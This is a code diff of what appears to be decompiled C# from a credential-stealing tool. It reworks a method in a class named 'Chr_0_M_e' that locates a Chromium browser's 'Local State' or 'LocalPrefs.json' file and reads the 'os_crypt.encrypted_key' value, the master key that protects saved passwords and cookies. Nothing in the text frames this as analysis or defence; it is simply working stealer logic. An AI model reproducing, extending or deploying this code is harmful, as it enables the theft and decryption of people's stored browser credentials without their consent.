@@ -327,68 +327,68 @@ public static class Chr_0_M_e
 	private static string ReadKey(string profilePath)
 	{
 		string result = string.Empty;
-		string path = string.Empty;
+		string empty = string.Empty;
 		try
 		{
-			string[] array = profilePath.Split(new string[]
-			{
-				"\\"
-			}, StringSplitOptions.RemoveEmptyEntries);
-			array = array.Take(array.Length - 1).ToArray<string>();
+			string[] array = profilePath.Split(new string[1] { "\\" }, StringSplitOptions.RemoveEmptyEntries);
+			array = array.Take(array.Length - 1).ToArray();
 			int num = 0;
-			for (;;)
+			while (true)
 			{
-				if (num == 0)
+				switch (num)
 				{
-					path = Path.Combine(string.Join("\\", array), "Local State");
-					if (File.Exists(path))
+				default:
+					continue;
+				case 0:
+					empty = Path.Combine(string.Join("\\", array), "Local State");
+					if (!File.Exists(empty))
 					{
-						goto IL_CF;
+						num++;
+						continue;
 					}
-					num++;
-				}
-				else if (num == 1)
-				{
-					path = Path.Combine(profilePath, "Local State");
-					if (File.Exists(path))
+					break;
+				case 1:
+					empty = Path.Combine(profilePath, "Local State");
+					if (!File.Exists(empty))
 					{
-						goto IL_CF;
+						num++;
+						continue;
 					}
-					num++;
-				}
-				else if (num == 2)
-				{
-					path = Path.Combine(string.Join("\\", array), "LocalPrefs.json");
-					if (File.Exists(path))
+					break;
+				case 2:
+					empty = Path.Combine(string.Join("\\", array), "LocalPrefs.json");
+					if (!File.Exists(empty))
 					{
-						goto IL_CF;
+						num++;
+						continue;
 					}
-					num++;
-				}
-				else if (num == 3)
-				{
+					break;
+				case 3:
+					empty = Path.Combine(profilePath, "LocalPrefs.json");
 					break;
 				}
+				break;
 			}
-			path = Path.Combine(profilePath, "LocalPrefs.json");
-			IL_CF:
-			if (File.Exists(path))
+			if (File.Exists(empty))
 			{
 				try
 				{
 					using (new FileCopier())
 					{
-						result = File.ReadAllText(path).FromJSON<LocalState>().os_crypt.encrypted_key;
+						result = File.ReadAllText(empty).FromJSON<LocalState>().os_crypt.encrypted_key;
+						return result;
 					}
 				}
 				catch (Exception)
 				{
+					return result;
 				}
 			}
+			return result;
 		}
 		catch
 		{
+			return result;
 		}
-		return result;
 	}
 }
